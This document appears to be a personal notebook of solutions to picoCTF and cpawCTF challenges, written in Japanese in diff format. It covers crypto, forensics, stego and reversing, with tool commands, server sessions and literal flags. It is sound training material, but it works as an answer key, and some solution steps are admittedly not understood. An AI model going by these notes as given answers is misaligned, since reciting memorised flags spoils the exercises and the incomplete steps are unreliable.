+[Cryptography] 換え字暗号（数字を数字と文字に置き換える、1文字ごとツールに打ち込んで、合っているか推定していく、何文字かは出てこないので完全なあてずっぽう）
+102_Cryptography_substitution2置換2
+
+最後のflagフォーマットと周辺の文字から、「THEFLAGISPICOCTF{」を最初に推定する
+以降は、少しずつ拡張する
+
+
+[Cryptograph] Cyberchefでヴィジェネル暗号を解くとフラグが求まる
+105_Cryptography_Vigenereヴィジェネール
+Vigenere Decode
+
+
+[Cryptography] メッセージを３文字単位で規則的に並び替えるとフラグが求まる（スペースも意味がある）
+103_Cryptography_transposition-trial移調トライアル
+
+heT   fl    g a   s i   icp   CTo   {7F   4NR   P05   1N5   _16   _35   P3X   51N   3_V   091   B0A   E}2
+The    fl   ag    is    pic   oCT   F{7   R4N   5P0   51N   6_1   5_3   XP3   N51   V3_   109   AB0   2E}
+
+TheflagispicoCTF{7R4N5P051N6_15_3XP3N51V3_109AB02E}
+
+
+[General Skill] 指定された文字列のmd5を入力するとフラグが求まる
+MD5 Hash Generator
+https://www.md5hashgenerator.com/
+
+Please md5 hash the text between quotes, excluding the quotes: 'hair transplants'
+Answer:
+5b416c0db26c7e0478766fc51931a3ab
+5b416c0db26c7e0478766fc51931a3ab
+Correct.
+picoCTF{4ppl1c4710n_r3c31v3d_bf2ceb02}
+
+
+[General Skill] pythonの構文ミスを修正して実行するとフラグが求まる
+066_General Skills_fixme1.py
+
+[General Skill] pythonの構文ミスを修正して実行するとフラグが求まる
+067_General Skills_fixme2.py
+
+[General Skill] 7つのパスワード候補をそれぞれ入力すると、いずれフラグが求まる
+072_General Skills_PW Crack 3PWクラック3
+Please enter correct password for flag: 865e
+Welcome back... your flag, user:
+picoCTF{m45h_fl1ng1ng_2b072a90}
+
+[General Skill] pythonコードを変更して100個のパスワード候補をすべて試すとフラグが求まる
+073_General Skills_PW Crack 4PWクラック4
+
+[General Skill]  pythonコードを変更して辞書のパスワード候補をすべて試すとフラグが求まる
+074_General Skills_PW Crack 5PWクラック5
+
+[General Skill] pythonコードの中にフラグがある
+075_General Skills_runme.py
+
+
+[Reverse_Engineering] pythonファイルの中で使われていないコード部分を実行して暗号文を復号
+picoCTF\015_Reverse_Engineering_3_crackme-py.mhtml
+
+
+[Reverse_Engineering] Javaファイルの中にハードコードされているフラグ
+021_Reverse_Engineering_5_vault-door-training.mhtml
+
+
+[General Skill] pythonのコードに書かれているパスワードを入力するとフラグが求まる
+Please enter correct password for flag: 691d
+Welcome back... your flag, user:
+picoCTF{545h_r1ng1ng_56891419}
+
+
+
+[Reverse Engineering] Javaファイルの中にハードコードされている文字を並び替えてフラグを求める
+045_Reverse Engineering_vault-door-1金庫室の扉-1
+
+0～31に対応する文字を順番通りに並び変える
+               password.charAt(0)  == 'd' &&
+               password.charAt(29) == 'a' &&
+               password.charAt(4)  == 'r' &&
+               password.charAt(1)  == '3' &&
+フラグ：d3・・・
+
+
+
+[Cryptography] 遠隔のサーバー (nc mercury.picoctf.net 36449) で実行されているPythonプログラムを解析してフラグを取得する
+018_Cryptography_3_Easy_Peasy.mhtml
+フラグ（32バイト） XOR 鍵（32バイト）                                            = 暗号化されたフラグ（32バイト）
+入力               XOR 鍵（50000バイト、オフセット値によって使われる値が決まる） = 暗号文
+
+暗号文（32バイト）
+622764205c786131695c7830325c7863645c7862615c7863345c786562316e5c
+
+暗号化されたフラグ（32バイト）
+551257106e1a52095f654f510a6b4954026c1e0304394100043a1c5654505b6b
+
+入力（50000 - 32 バイト）  python3 -c "print('A'*(50000-32)+'\n'+'\x00'*32)" | nc mercury.picoctf.net 36449
+\x00
+
+↓
+
+暗号文 XOR 暗号化されたフラグ = フラグ（75302b38697a8717f0faee9c0fd36a57）　入力は0のため
+
+From Hex 16進数の値をアスキー表示する
+
+XORの方法が不明
+0x62=98 1001 1000
+0x55=85 1000 0101
+        0001 1101
+
+
+
+[Web Exploitation] Cookieの値にBit-flipping attack on CBC mode でフラグを取得
+040_Web Exploitation_More Cookiesその他のクッキー
+https://tech.kusuwada.com/entry/2021/04/08/121028
+問題文が不自然に大文字が混じっている（ヒント：CBC）
+
+WebにBit-flipping attackでCookieの値を変えて、正しいCookieのときフラグが求まる
+
+
+
+[Forensics] jpgファイルにbinwalkコマンドを何回も適用してフラグを取得
+picoCTF\014_Forensics_2_マトリョーシカ人形
+binwalk -e --run-as=rootコマンド：ファイルの中に含まれているファイルを抽出できるコマンド
+どのファイルにコマンドを適用しても得られるフラグは同じ
+
+
+[Forensics] 
+111_Forensics_hideme私をかくまってください
+
+$ binwalk -e 111_flag.png
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             PNG image, 512 x 504, 8-bit/color RGBA, non-interlaced
+41            0x29            Zlib compressed data, compressed
+39739         0x9B3B          Zip archive data, at least v1.0 to extract, name: secret/
+39804         0x9B7C          Zip archive data, at least v2.0 to extract, compressed size: 2869, uncompressed size: 3024, name: secret/flag.png
+42908         0xA79C          End of Zip archive, footer length: 22
+
+
+
+
+[Crypto] ハッシュ値の復号
+cpawCTF\Level_1_8_[Crypto]HashHashHash!.mhtml
+ハッシュ値のネット検索
+Hash Toolkit　https://hashtoolkit.com/
+
+
+
+[Reverse_Engineering] 問題に書かれている処理をプログラムで実装して暗号文を復号
+picoCTF\007_Reverse_Engineering_1_Transformation.mhtml
+
+暗号化：平文を2文字ずつ取り出し、1文字目を左へ8桁シフトした後、2文字目と連結させ、最後にユニコード文字に変換する
+''.join([chr((ord(flag[i]) << 8) + ord(flag[i + 1])) for i in range(0, len(flag), 2)])
+
+復号化：picoCTF{16_bits_inst34d_of_8_0ddcd97a}
+encoded_flag = '灩捯䍔䙻ㄶ形楴獟楮獴㌴摟潦弸弰摤捤㤷慽'
+decoded_flag = ''
+for i in range(0, len(encoded_flag)):
+	decoded_flag += chr(ord(encoded_flag[i]) >> 8)
+	print(                                decoded_flag[i], end='')		# pcCF1_isis3do__dc9a
+	print(chr(ord(encoded_flag[i]) - (ord(decoded_flag[i]) << 8)), end='')	# ioT{6bt_nt4_f80dd7}
+
+
+[General Skills] bashを実行してフラグを取得
+picoCTF\011_General Skills_5_Static ain't always noise.mhtml
+stringsコマンド、バイナリエディタでフラグを取得可能
+おまけ　bashを実行してusageを取得し、引数を渡して実行すると出力ファイルができる、これを解析するとフラグが得られそうだが、取得方法は不明
+bash test.sh
+bash test.sh sample.txt
+
+
+
+[Stego] 画像にモールス信号（２か所）
+cpawCTF\Level_2_1_[Stego]隠されたフラグ.mhtml
+https://morse.ariafloat.com/en/　にモールス入力[.][-][space]
+-.-. .--. .- .-- .... .. -.. -.. . -. ..--.-  -- . ... ... .- --. . ---... -.--.- 
+変換文字：CPAWHIDDEN_ MESSAGE:)
+正　　解：cpaw{hidden_message:)}
+※1 ｛｝を自分でつける
+※2 ２か所のつなぎ目にスペース（変換された文字を見て、スペースを自分で入れる）
+※3 ２か所の最後にスペース（フラグを入力して不正解のときに、不自然だがスペースを自分で入れてみる）
+
+
+[Forensics] サイトでF12してpngファイルをダウンロードし、zstegコマンドを行うとフラグが求まる（実際は求まらない）
+148_Forensics_Milkslapミルクスラップ
+
+$ zsteg concat_v.png
+/var/lib/gems/3.1.0/gems/zpng-0.4.5/lib/zpng/scan_line.rb:303:in `upto': stack level too deep (SystemStackError)
+        from /var/lib/gems/3.1.0/gems/zpng-0.4.5/lib/zpng/scan_line.rb:303:in `decoded_bytes'
+        from /var/lib/gems/3.1.0/gems/zpng-0.4.5/lib/zpng/scan_line/mixins.rb:17:in `prev_scanline_byte'
+        from /var/lib/gems/3.1.0/gems/zpng-0.4.5/lib/zpng/scan_line.rb:377:in `prev_scanline_byte'
+        from /var/lib/gems/3.1.0/gems/zpng-0.4.5/lib/zpng/scan_line.rb:319:in `block in decoded_bytes'
+        from /var/lib/gems/3.1.0/gems/zpng-0.4.5/lib/zpng/scan_line.rb:318:in `upto'
+        from /var/lib/gems/3.1.0/gems/zpng-0.4.5/lib/zpng/scan_line.rb:318:in `decoded_bytes'
+        from /var/lib/gems/3.1.0/gems/zpng-0.4.5/lib/zpng/scan_line/mixins.rb:17:in `prev_scanline_byte'
+        from /var/lib/gems/3.1.0/gems/zpng-0.4.5/lib/zpng/scan_line.rb:377:in `prev_scanline_byte'
+         ... 9483 levels...
+        from /var/lib/gems/3.1.0/gems/zsteg-0.2.13/lib/zsteg.rb:26:in `run'
+        from /var/lib/gems/3.1.0/gems/zsteg-0.2.13/bin/zsteg:8:in `<top (required)>'
+        from /usr/local/bin/zsteg:25:in `load'
+        from /usr/local/bin/zsteg:25:in `<main>'
+
+writeupの記事
+manifold@pwnmach1n3:~$ zsteg concat_v.png
+imagedata           .. file: dBase III DBT, version number 0, next free block index 3368931841, 1st item "\001\001\001\001"
+b1,b,lsb,xy         .. text: "picoCTF{imag3_m4n1pul4t10n_sl4p5}\n"
+b1,bgr,lsb,xy       .. <wbStego size=9706075, data="\xB6\xAD\xB6}\xDB\xB2lR\x7F\xDF\x86\xB7c\xFC\xFF\xBF\x02Zr\x8E\xE2Z\x12\xD8q\xE5&MJ-X:\xB5\xBF\xF7\x7F\xDB\xDFI\bm\xDB\xDB\x80m\x00\x00\x00\xB6m\xDB\xDB\xB6\x00\x00\x00\xB6\xB6\x00m\xDB\x12\x12m\xDB\xDB\x00\x00\x00\x00\x00\xB6m\xDB\x00\xB6\x00\x00\x00\xDB\xB6mm\xDB\xB6\xB6\x00\x00\x00\x00\x00m\xDB", even=true, mix=true, controlbyte="[">
+b2,r,lsb,xy         .. file: SoftQuad DESC or font file binary
+
+
+[Cryptography] モールスのwavファイルをサイトで複合してフラグを取得する
+092_Cryptography_morse-code
+
+Morse Code Sound & Vibration Listener　　スペースも入れてくれる
+https://databorder.com/transfer/morse-sound-receiver/
+WH47 H47H 90D W20U9H7
+
+Morse Code Adaptive Audio Decoder　スペースを入れてくれない（無音が長く続いた時をスペースとする）
+https://morsecode.world/international/decoder/audio-decoder-adaptive.html
+W H 4 7 H 4 7 H 9 0 D W 2 0 U 9 H 7
+
+途中でstopを押すと、複合を間違える
+
+
+[Recon] Twitterのアカウント名の特定
+cpawCTF\Level_2_4_[Recon]Who am I .mhtml
+キーワードをGoogle検索
+Twitterの中で検索
+
+
+
+[General Skills] 16進数のアスキー表示
+023_General Skills_Lets Warm Up
+バイナリエディタに16進数を入力
+0x70 = p
+
+
+[Forensics] バイナリエディタ、stringsコマンドでフラグを取得
+024_Forensics_Glory of the Gardenガーデンの栄光
+Here is a flag "picoCTF{more_than_m33ts_the_3y33dd2eEF5}"
+
+
+[General Skills] 16進数を10進数に変換
+025_General Skills_Warmed Up
+0x3D=61
+
+
+[Cryptography] pngに書かれた数字（3～20）と{,}から、数字を文字に変換（a:1,b:2,c:3・・・）
+026_Cryptography_The Numbers
+picoctf{thenumbersmason}
+
+[Cryptography] ROT13するとフラグが求まる
+050_Cryptography_13
+cvpbPGS{abg_gbb_onq_bs_n_ceboyrz}
+picoCTF{not_too_bad_of_a_problem}
+
+
+[Cryptography] 2つの画像ファイルを重ね合わせた画像からフラグを取得
+055_Cryptography_Pixelatedピクセル化された
+
+方法1　プログラムを使う
+
+方法2-1　以下のサイトで重ね合わせた画像を取得（画像は必ず圧縮しない）
+https://www.imgonline.com.ua/eng/impose-picture-on-another-picture.php
+方法2-2　stegsolveでmapをランダムに変えるとフラグが求まる（kaliで実行すると、Linuxウィンドウにstegsolveが起動する）
+cd Desktop/picoCTF
+wget http://www.caesum.com/handbook/Stegsolve.jar -O stegsolve.jar
+chmod +x stegsolve.jar
+mkdir bin
+mv stegsolve.jar bin/
+export DISPLAY=:1
+java -jar stegsolve.jar
+stegsolveで重ね合わせた画像を開いた後、→を何回かクリックする（Random Color Mapが変わる）とフラグが求まる
+
+
+[Forensics] PNGの破損ファイルをバイナリエディタで修復し、stegsolveでmapをランダムに変えてフラグを求める
+062_Forensics_advanced-potion-making
+Red plane 0のときフラグが求める
+
+
+[Cryptography] 暗号化されたフラグと文字列の頻度分布を求めて、換え字式暗号を解いてフラグを求める
+063_Cryptography_spelling-quizスペルクイズ
+以下のサイトに、暗号化されたフラグと文字列を入力して、Solveをクリックする
+https://www.quipqiup.com/
+
+
+[Cryptography] プレイフェア（playfair）暗号を複合して平文を入力するとフラグが求まる（フラグにpicoCTF{}が付かない）
+145_Cryptography_Play Nice仲良く遊びます
+
+$ nc mercury.picoctf.net 33686
+Here is the alphabet: v60ufmk7edg4z13h2oyqa9ib58ntwxlrscjp
+Here is the encrypted message: 4celvfdkoq5a0dx7pr40ifzctd8488
+What is the plaintext message? dpksmue41bnyue84jlem2jhl9ux755
+Congratulations! Here's the flag: 3a64de31e7b5acb6c87ae45050e187ee
+
+プレイフェア（playfair）暗号の復号サイト
+https://www.dcode.fr/playfair-cipher
+
+
+[Cryptography] Double DES(2DES)の制限付きの鍵を総当たりして平文を求めるとフラグが求まる（原理不明）
+149_Cryptography_Double DESデュアル DES
+
+$ python 149_solve.py
+[+] Opening connection to mercury.picoctf.net on port 3620: Done
+[*] Encrypted flag: e2a397551d72f41539968107b002bcb331af547b40574529d17c52e9913193ea56d5f8c722c574a9
+[*] Trying to encrypt 'b'a''
+/mnt/c/Users/user/Desktop/picoCTF/149_solve3.py:33: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  r.sendlineafter("What data would you like to encrypt?", enhex(to_encrypt))
+/usr/lib/python3/dist-packages/pwnlib/tubes/tube.py:823: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  res = self.recvuntil(delim, timeout=timeout)
+[*] Encrypted form: 33ecb54700c68306
+[+] Encrypting plaintext with all possible keys: Done
+[+] Decrypting ciphertext with all possible keys: Done
+[*] Found match, key1 = b'513133  ', key2 = b'026284  '
+/usr/lib/python3/dist-packages/pwnlib/log.py:347: BytesWarning: Bytes is not text; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  self._log(logging.INFO, message, args, kwargs, 'success')
+[+] 3b19585774c51cea36113c7b2c741a62　フラグ
+[*] Closed connection to mercury.picoctf.net port 3620
+
+
+[Binary Exploitation] 脆弱性情報からCVE番号を調べるとフラグが求まる
+082_Binary Exploitation_CVE-XXXX-XXXX
+Windows プリント スプーラー サービスで 2021 年に記録された最初のリモート コード実行 (RCE) 脆弱性　CVE-2021-34527
+picoCTF{CVE-2021-34527}
+
+
+[Forensics] mmlsコマンドでイメージファイルのpartitionサイズを取得し、それを入力するとフラグが求まる
+099_Forensics_Sleuthkit Intro
+
+$ mmls 099_disk.img
+DOS Partition Table
+Offset Sector: 0
+Units are in 512-byte sectors
+
+      Slot      Start        End          Length       Description
+000:  Meta      0000000000   0000000000   0000000001   Primary Table (#0)
+001:  -------   0000000000   0000002047   0000002048   Unallocated
+002:  000:000   0000002048   0000204799   0000202752   Linux (0x83)
+
+$ nc saturn.picoctf.net 52472
+What is the size of the Linux partition in the given disk image?
+Length in sectors: 202752
+202752
+Great work!
+picoCTF{mm15_f7w!}
+
+
+[Forensics] imgファイルをstringsコマンドするとフラグが求まる
+144_Forensics_Disk, disk, sleuth!ディスク、ディスク、探偵！
+
+gzip -d dds2-alpine.flag.img
+
+$ srch_strings dds1-alpine.flag.img | grep pico		srch_strings - ファイル内の印刷可能な文字列を表示する
+ffffffff81399ccf t pirq_pico_get
+ffffffff81399cee t pirq_pico_set
+ffffffff820adb46 t pico_router_probe
+
+  SAY picoCTF{f0r3ns1c4t0r_n30phyt3_a69a712c}
+
+$ strings dds1-alpine.flag.img | grep pico
+ffffffff81399ccf t pirq_pico_get
+ffffffff81399cee t pirq_pico_set
+ffffffff820adb46 t pico_router_probe
+  SAY picoCTF{f0r3ns1c4t0r_n30phyt3_a69a712c}
+
+$ file dds1-alpine.flag.img
+dds1-alpine.flag.img: DOS/MBR boot sector; partition 1 : ID=0x83, active, start-CHS (0x0,32,33), end-CHS (0x10,81,1), startsector 2048, 260096 sectors
+
+$ mmls dds1-alpine.flag.img
+DOS Partition Table
+Offset Sector: 0
+Units are in 512-byte sectors
+
+      Slot      Start        End          Length       Description
+000:  Meta      0000000000   0000000000   0000000001   Primary Table (#0)
+001:  -------   0000000000   0000002047   0000002048   Unallocated
+002:  000:000   0000002048   0000262143   0000260096   Linux (0x83)
+
+$ fdisk -l -u dds1-alpine.flag.img
+Disk dds1-alpine.flag.img: 128 MiB, 134217728 bytes, 262144 sectors	ディスク dds2-alpine.flag.img: 128 MiB, 134217728 バイト, 262144 セクタ
+Units: sectors of 1 * 512 = 512 bytes					単位: セクタ (1 * 512 = 512 バイト)
+Sector size (logical/physical): 512 bytes / 512 bytes			セクタサイズ (論理 / 物理): 512 バイト / 512 バイト
+I/O size (minimum/optimal): 512 bytes / 512 bytes			I/O サイズ (最小 / 推奨): 512 バイト / 512 バイト
+Disklabel type: dos							ディスクラベルのタイプ: dos
+Disk identifier: 0x5d8b75fc						ディスク識別子: 0x5d8b75fc
+
+デバイス              起動 開始位置 最後 セクタ サイズ Id タイプ
+Device                Boot Start    End Sectors  Size Id Type
+dds1-alpine.flag.img1 *     2048 262143  260096  127M 83 Linux
+
+$ fls -r -b 512 -o 2048 dds1-alpine.flag.img > 144_fls.txt
+144_fls.txtを「root」を検索
+d/d 26418:      root
+
+$ icat -b 512 -o 2048 dds1-alpine.flag.img 26418
+2g...
+
+$ icat -o 2048 dds1-alpine.flag.img 26418
+2g...
+
+
